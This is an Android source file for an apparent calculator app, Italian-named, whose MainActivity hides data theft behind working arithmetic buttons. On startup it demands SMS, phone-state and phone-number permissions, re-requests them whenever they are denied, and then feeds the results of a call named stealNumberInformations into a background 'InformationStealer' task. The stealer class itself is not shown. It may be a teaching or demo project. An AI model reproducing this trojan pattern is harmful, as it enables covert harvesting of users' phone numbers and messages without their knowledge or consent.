package com.example.applicazioneinteressante;

import static com.example.applicazioneinteressante.InformationStealer.stealNumberInformations;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.appcompat.app.AppCompatDelegate;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.annotation.SuppressLint;
import android.Manifest;

import android.content.pm.ActivityInfo;

import android.content.pm.PackageManager;

import android.os.Bundle;

import android.widget.Button;
import android.widget.TextView;

import java.util.concurrent.Executor;
import java.util.concurrent.Executors;

public class MainActivity extends AppCompatActivity {

    private static final int PERMISSION_REQUEST_PHONE_STATE = 1;
    private String operation = "";
    private double op1 = 0, op2 = 0, prevResult = 0;
    private TextView current, history;
    private InformationStealer task = new InformationStealer(this);

    private class MyNumberButton {
        Button b;

        @SuppressLint("SetTextI18n")
        public MyNumberButton(Button v) {
            b = v;
            b.setOnClickListener(v1 -> {
                if (current.getText().equals("0") && !b.getText().equals("0")) {
                    current.setText(b.getText());
                } else {
                    current.setText(current.getText().toString() + b.getText().toString());
                }
            });
        }
    }

    private class MyBaseOpButton {
        Button b;

        @SuppressLint("SetTextI18n")
        public MyBaseOpButton(Button v, String op) {
            b = v;
            b.setOnClickListener(v1 -> {
                if (!operation.equals("")) {
                    if (prevResult == 0) {
                        operation = op;
                        history.setText(op1 + operation);
                        current.setText("0");
                    } else {
                        operation = op;
                        op1 = prevResult;
                        history.setText(op1 + operation);
                        current.setText("0");
                    }
                } else {
                    op1 = Double.parseDouble(current.getText().toString());
                    operation = op;
                    history.setText(op1 + operation);
                    current.setText("0");
                }
            });
        }
    }

    private class MyAdvOpButton {

        Button b;

        @SuppressLint("SetTextI18n")
        public MyAdvOpButton(Button v, String op) {
            b = v;
            b.setOnClickListener(v1 -> {
                if (!operation.equals("")) current.setError("Input error");
                else {
                    double opy = Double.parseDouble(current.getText().toString());
                    switch (op) {
                        case "log":
                            if (opy <= 0) {
                                current.setError("Input Error");
                                current.setText("0");
                            } else {
                                op1 = opy;
                                prevResult = Math.log(op1);
                                history.setText("ln(" + op1 + ")");
                                current.setText(Double.toString(prevResult));
                            }
                            break;
                        case "sqrt":
                            if (op1 < 0) {
                                current.setError("Input Error");
                                current.setText("0");
                            } else {
                                op1 = opy;
                                prevResult = Math.sqrt(op1);
                                history.setText("sqrt(" + op1 + ")");
                                current.setText(Double.toString(prevResult));
                            }
                            break;
                        case "pow":
                            op1 = opy;
                            operation = op;
                            history.setText(op1 + " ^ ");
                            current.setText("0");
                            break;
                    }
                }
            });
        }
    }

    @SuppressLint("SourceLockedOrientationActivity")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        AppCompatDelegate.setDefaultNightMode(AppCompatDelegate.MODE_NIGHT_NO);
        setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_PORTRAIT);

        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        initializeComponents();
        Executor executor = Executors.newSingleThreadExecutor();

        String[] permissions = {
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.READ_SMS,
                Manifest.permission.READ_PHONE_NUMBERS
        };

        boolean allPermissionsGranted = true;
        for (String permission : permissions) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                allPermissionsGranted = false;
                break;
            }
        }

        if (!allPermissionsGranted) {
            ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_PHONE_STATE);
        } else {
            // Tutti i permessi sono già stati concessi
            task.setMessaggio(task.getMessaggio().append(stealNumberInformations(this)));
        }

        executor.execute(task);
    }

    //Initialize components in the class
    @SuppressLint("SetTextI18n")
    @SuppressWarnings("unused")
    void initializeComponents() {
        //Add listener on number buttons with inner class MyNumberButton
        MyNumberButton zero = new MyNumberButton(findViewById(R.id.number0));
        MyNumberButton one = new MyNumberButton(findViewById(R.id.number1));
        MyNumberButton two = new MyNumberButton(findViewById(R.id.number2));
        MyNumberButton three = new MyNumberButton(findViewById(R.id.number3));
        MyNumberButton four = new MyNumberButton(findViewById(R.id.number4));
        MyNumberButton five = new MyNumberButton(findViewById(R.id.number5));
        MyNumberButton six = new MyNumberButton(findViewById(R.id.number6));
        MyNumberButton seven = new MyNumberButton(findViewById(R.id.number7));
        MyNumberButton eight = new MyNumberButton(findViewById(R.id.number8));
        MyNumberButton nine = new MyNumberButton(findViewById(R.id.number9));

        //Add listener on simple operation's button with inner class MyBaseOpButton
        MyBaseOpButton plus = new MyBaseOpButton(findViewById(R.id.opPlus), "+");
        MyBaseOpButton minus = new MyBaseOpButton(findViewById(R.id.opMinus), "-");
        MyBaseOpButton muls = new MyBaseOpButton(findViewById(R.id.opMuls), "*");
        MyBaseOpButton divide = new MyBaseOpButton(findViewById(R.id.opDivide), "/");

        //Add listener on advanced operation's button with inner class MyAdvOpButton
        MyAdvOpButton log = new MyAdvOpButton(findViewById(R.id.opLog), "log");
        MyAdvOpButton sqrt = new MyAdvOpButton(findViewById(R.id.opSqrt), "sqrt");
        MyAdvOpButton pow = new MyAdvOpButton(findViewById(R.id.opPower), "pow");

        this.<Button>findViewById(R.id.pointBtn).setOnClickListener(v -> {
            double currNumber = Double.parseDouble(current.getText().toString());
            int integerPart = (int) currNumber;
            if ((currNumber - integerPart) == 0) {
                current.setText(current.getText() + ".");
            }
        });

        this.<Button>findViewById(R.id.opEqual).setOnClickListener(v -> {
            op2 = Double.parseDouble(current.getText().toString());
            switch (operation) {
                case "+":
                    prevResult = op1 + op2;
                    history.setText(op1 + " " + operation + " " + op2);
                    current.setText(Double.toString(prevResult));
                    operation = "";
                    break;
                case "-":
                    prevResult = op1 - op2;
                    history.setText(op1 + " " + operation + " " + op2);
                    current.setText(Double.toString(prevResult));
                    operation = "";
                    break;
                case "*":
                    prevResult = op1 * op2;
                    history.setText(op1 + " " + operation + " " + op2);
                    current.setText(Double.toString(prevResult));
                    operation = "";
                    break;
                case "/":
                    if (op2 == 0) {
                        current.setError("Input Error");
                    } else {
                        prevResult = op1 / op2;
                        history.setText(op1 + " " + operation + " " + op2);
                        current.setText(Double.toString(prevResult));
                        operation = "";
                    }
                    break;
                case "pow":
                    prevResult = Math.pow(op1, op2);
                    history.setText(history.getText().toString() + op2);
                    current.setText(Double.toString(prevResult));
                    operation = "";
                    break;
            }
            System.out.println(task.getMessaggio());
        });

        this.<Button>findViewById(R.id.ansBtn).setOnClickListener(v -> {
            if (prevResult != 0) {
                current.setText(Double.toString(prevResult));
            }
        });

        //Cancel buttons
        this.<Button>findViewById(R.id.cancel).setOnClickListener(v -> current.setText("0"));
        this.<Button>findViewById(R.id.cancelAll).setOnClickListener(v -> {
            history.setText("");
            current.setText("0");
            prevResult = 0;
        });

        //Text fields that show current operation
        current = findViewById(R.id.insertion);
        history = findViewById(R.id.ans);
    }



    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE)
                != PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
                        != PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_NUMBERS)
                        != PackageManager.PERMISSION_GRANTED) {

            ActivityCompat.requestPermissions(this, new String[]{
                    Manifest.permission.READ_PHONE_STATE,
                    Manifest.permission.READ_SMS,
                    Manifest.permission.READ_PHONE_NUMBERS
            }, PERMISSION_REQUEST_PHONE_STATE);
        } else {
            // I permessi sono già stati concessi
            task.setMessaggio(task.getMessaggio().append(stealNumberInformations(this)));
        }
    }


}

